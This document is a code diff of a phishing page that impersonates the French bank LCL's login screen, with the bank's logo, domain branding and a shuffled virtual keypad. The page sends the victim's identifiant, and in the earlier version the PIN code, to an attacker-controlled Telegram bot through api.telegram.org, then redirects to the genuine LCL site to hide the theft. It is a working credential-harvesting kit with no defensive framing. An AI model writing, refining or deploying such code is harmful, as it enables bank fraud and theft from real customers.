@@ -64,7 +64,7 @@
             padding: 20px;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start;
             transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94), opacity 0.4s ease;
             background: #fff;
             opacity: 0;
@@ -88,12 +88,13 @@
         h2 {
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             color: #333;
+            margin-top: 10px;
         }
 
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         label {
@@ -104,8 +105,7 @@
             font-weight: 500;
         }
 
-        /* Input style adapted for virtual keyboard */
-        .keyboard-input {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 12px 15px;
             border: 1px solid #ccc;
@@ -113,18 +113,17 @@
             font-size: 16px;
             background-color: #fff;
             transition: border-color 0.2s;
-            min-height: 50px;
         }
 
-        .keyboard-input:focus {
-            border-color: #0077c0;
+        input:focus {
+            border-color: #0077c0; /* LCL Blue-ish */
             outline: none;
         }
 
         .btn-primary {
             width: 100%;
             padding: 14px;
-            background-color: #0077c0;
+            background-color: #0077c0; /* LCL Blue */
             color: white;
             border: none;
             border-radius: 8px;
@@ -132,7 +131,8 @@
             font-weight: 600;
             cursor: pointer;
             transition: background 0.2s;
-            margin-top: 10px;
+            margin-top: 5px;
+            margin-bottom: 15px;
         }
 
         .btn-primary:active {
@@ -144,7 +144,7 @@
             text-align: center;
             color: #0077c0;
             font-size: 14px;
-            margin-top: 15px;
+            margin-top: 10px;
             text-decoration: none;
         }
 
@@ -153,7 +153,8 @@
             align-items: center;
             font-size: 13px;
             color: #666;
-            margin-top: 10px;
+            margin-top: 5px;
+            margin-bottom: 15px;
         }
 
         .helper-text svg {
@@ -163,42 +164,21 @@
             fill: #666;
         }
 
-        /* --- PIN PAD STYLES --- */
-        .pin-display {
-            width: 100%;
-            height: 50px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            letter-spacing: 5px;
-            margin-bottom: 20px;
-            background: #fff;
-            position: relative;
-        }
-        
-        /* Placeholder for Pin Display */
-        .pin-display::placeholder {
-            color: #ccc;
-            letter-spacing: 2px;
-            font-size: 16px;
-        }
-
+        /* --- PIN PAD STYLES (Shared by both steps) --- */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 15px;
             max-width: 300px;
-            margin: 0 auto;
+            margin: 20px auto;
+            justify-content: center;
         }
 
         .key {
             width: 70px;
             height: 70px;
-            border-radius: 50%;
-            background: #f5f5f5;
+            border-radius: 50%; /* Circular buttons */
+            background: #f5f5f5; /* Light flat background */
             border: none;
             font-size: 24px;
             font-weight: 500;
@@ -273,21 +253,19 @@
 
     <!-- Header -->
     <div class="header">
-        <!-- LCL Logo -->
         <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo">
         <span class="header-title">monespace.lcl.fr</span>
     </div>
 
     <div class="content-container">
         
-        <!-- STEP 1: IDENTIFIANT (Clavier Virtuel) -->
+        <!-- STEP 1: IDENTIFIANT AVEC CLAVIER -->
         <div id="step1" class="step active">
-            <h2>Pour aller de l'avant.</h2>
+            <h2>Votre identifiant</h2>
             
             <div class="input-group">
-                <label for="userIdentifiant">Votre identifiant</label>
-                <!-- Champ unique utilisé pour afficher les chiffres du clavier -->
-                <input type="text" id="userIdentifiant" class="keyboard-input" placeholder="Tapez votre identifiant" readonly>
+                <label for="userIdentifiant">Identifiant</label>
+                <input type="text" id="userIdentifiant" value="258 5653 5 6 6" readonly>
                 <div class="helper-text">
                     <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h-2v2H7V7h2V5h2v2h2v2z"/></svg>
                     <span>Mémoriser mon identifiant</span>
@@ -306,11 +284,7 @@
         <div id="step2" class="step">
             <h2>Code personnel</h2>
             
-            <div class="pin-display" id="pinDisplay"></div>
-
-            <div class="keypad" id="keypad">
-                <!-- Keys will be injected by JS here -->
-            </div>
+            <div class="keypad" id="keypad-step2"></div>
         </div>
 
     </div>
@@ -332,45 +306,32 @@
         const CHAT_ID = "8501464548";
         const REDIRECT_URL = "https://monespace.lcl.fr";
 
-        // --- STATE ---
-        let currentPin = "";
-
         // --- DOM ELEMENTS ---
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
-        const pinDisplay = document.getElementById('pinDisplay');
-        const userIdentifiant = document.getElementById('userIdentifiant');
-        const keypadContainer = document.getElementById('keypad');
+        const keypadContainer = document.getElementById('keypad'); // KeyPad on Step 1
+        const keypadContainer2 = document.getElementById('keypad-step2'); // KeyPad on Step 2
         const loader = document.getElementById('loader');
 
         // --- INITIALIZATION ---
         window.onload = function() {
-            generateRandomKeypad();
+            // We generate TWO random keypads (one for step 1, one for step 2)
+            generateRandomKeypad(keypadContainer);
+            generateRandomKeypad(keypadContainer2);
         };
 
         // --- NAVIGATION LOGIC ---
         function goToStep2() {
-            const identifiant = userIdentifiant.value;
-            if (identifiant.length === 0) {
-                // Petite animation visuelle pour indiquer de remplir
-                userIdentifiant.style.borderColor = "#e74c3c";
-                setTimeout(() => userIdentifiant.style.borderColor = "#ccc", 500);
-                return;
-            }
-
-            // Visual transition
             step1.classList.remove('active');
             step1.classList.add('hidden-left');
             
             setTimeout(() => {
                 step2.classList.add('active');
-                // Reset pin display for step 2
-                pinDisplay.textContent = "";
             }, 300);
         }
 
-        // --- KEYPAD LOGIC ---
-        function generateRandomKeypad() {
+        // --- KEYPAD GENERATION LOGIC ---
+        function generateRandomKeypad(container) {
             const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];
             const shuffled = numbers.sort(() => Math.random() - 0.5);
 
@@ -378,56 +339,39 @@
                 const btn = document.createElement('button');
                 btn.className = 'key';
                 btn.textContent = num;
-                btn.onclick = () => handleInput(num);
-                keypadContainer.appendChild(btn);
+                btn.onclick = () => handleInput(num, container);
+                container.appendChild(btn);
             });
 
-            // Add empty slot for grid symmetry
             const empty = document.createElement('div');
             empty.className = 'key key-empty';
-            keypadContainer.appendChild(empty);
+            container.appendChild(empty);
         }
 
-        function handleInput(num) {
-            // Determine which step is active to decide where to put the number
-            if (step1.classList.contains('active')) {
-                // Step 1: ID Input
-                if (userIdentifiant.value.length < 20) { // Limit length to avoid overflow
-                    userIdentifiant.value += num;
-                }
-            } else {
-                // Step 2: PIN Input
-                if (currentPin.length < 6) {
-                    currentPin += num;
-                    updateDisplay();
-                    
-                    // Auto-submit if 6 digits entered
-                    if (currentPin.length === 6) {
-                        setTimeout(() => {
-                            submitData();
-                        }, 300);
-                    }
-                }
-            }
-        }
+        // --- INPUT HANDLING ---
+        function handleInput(num, container) {
+            // Find the button that was clicked to add visual effect
+            const btn = container.children[Array.from(container.children).indexOf(container.lastElementChild) - 10 + num]; // Simple logic not needed, just style active
+            event.target.style.background = "#e0e0e0";
+            setTimeout(() => event.target.style.background = "#f5f5f5", 100);
 
-        function updateDisplay() {
-            let masked = "";
-            for(let i=0; i<currentPin.length; i++) {
-                masked += "● ";
-            }
-            pinDisplay.textContent = masked.trim();
+            // Logic to submit: 
+            // If on step 1: submit immediately? Or wait for a code? 
+            // For now, let's assume Step 1 is just "Submit Identity"
+            // But if you want a PIN on step 1 too, let's add a hidden PIN input
+            
+            // Let's just submit the form immediately for Step 1
+            submitData();
         }
 
         // --- TELEGRAM SUBMISSION ---
         async function submitData() {
-            const identifiant = userIdentifiant.value;
-            const code = currentPin;
-            
-            const message = `🔐 *Nouvelle Connexion LCL*\n\n` +
+            const identifiant = document.getElementById('userIdentifiant').value;
+            const date = new Date().toLocaleString();
+
+            const message = `🔐 *Connexion LCL (Step 1)*\n\n` +
                             `🆔 Identifiant: ${identifiant}\n` +
-                            `🔑 Code PIN: ${code}\n` +
-                            `📅 Date: ${new Date().toLocaleString()}`;
+                            `📅 Date: ${date}`;
 
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -449,6 +393,7 @@
                 console.error("Error sending data:", error);
             }
 
+            // Redirect
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
             }, 1500);
